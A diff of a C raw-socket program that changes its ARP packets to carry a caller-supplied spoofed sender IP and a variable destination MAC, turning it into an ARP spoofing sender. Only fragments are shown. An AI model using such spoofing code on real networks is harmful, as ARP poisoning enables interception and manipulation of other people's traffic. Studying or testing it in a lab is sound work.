@@ -20,16 +20,12 @@
 
 int main(int argc, char* argv[]) {
 
-	if(argc < 7) {
-		printf("unexpected number of arguments\n");
-		exit(-1);
-	}
-
 	char interface[24] = {0};
 	char target_ip[16] = {0};
 	char target_mac[18] = {0};
+	char spoof_ip[16] = {0};
 
-	int result = parse_args(argv, argc, interface, target_ip, target_mac);
+	int result = parse_args(argv, argc, interface, target_ip, target_mac, spoof_ip);
 
 	if(!result) {
 		exit(-1);
@@ -118,10 +114,10 @@ int main(int argc, char* argv[]) {
 	arp->src_mac[4] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[4]);
 	arp->src_mac[5] = (unsigned char)(ifr_macAddr.ifr_hwaddr.sa_data[5]);
 
-	char* src_ip = inet_ntoa((((struct sockaddr_in *)&(ifr_ip.ifr_addr))->sin_addr));
+	// char* src_ip = inet_ntoa((((struct sockaddr_in *)&(ifr_ip.ifr_addr))->sin_addr));
 
 	int ip[4];
-	extract_ip(src_ip, ip);
+	extract_ip(spoof_ip, ip);
 
 	arp->src_ip[0] = (unsigned char)ip[0];
 	arp->src_ip[1] = (unsigned char)ip[1];
@@ -148,12 +144,12 @@ int main(int argc, char* argv[]) {
 	struct sockaddr_ll sadr_ll;
 	sadr_ll.sll_ifindex = ifr.ifr_ifindex; // index of interface
 	sadr_ll.sll_halen = ETH_ALEN; // length of destination mac address
-	sadr_ll.sll_addr[0] = 0xf4;
-	sadr_ll.sll_addr[1] = 0x7b;
-	sadr_ll.sll_addr[2] = 0x09;
-	sadr_ll.sll_addr[3] = 0x12;
-	sadr_ll.sll_addr[4] = 0x53;
-	sadr_ll.sll_addr[5] = 0xfe;
+	sadr_ll.sll_addr[0] = dst_mac[0];
+	sadr_ll.sll_addr[1] = dst_mac[1];
+	sadr_ll.sll_addr[2] = dst_mac[2];
+	sadr_ll.sll_addr[3] = dst_mac[3];
+	sadr_ll.sll_addr[4] = dst_mac[4];
+	sadr_ll.sll_addr[5] = dst_mac[5];
 
 	int send_len = sendto(sock,send_buffer,64,0,(const struct sockaddr*)&sadr_ll,sizeof(struct sockaddr_ll));
 	if(send_len<0)
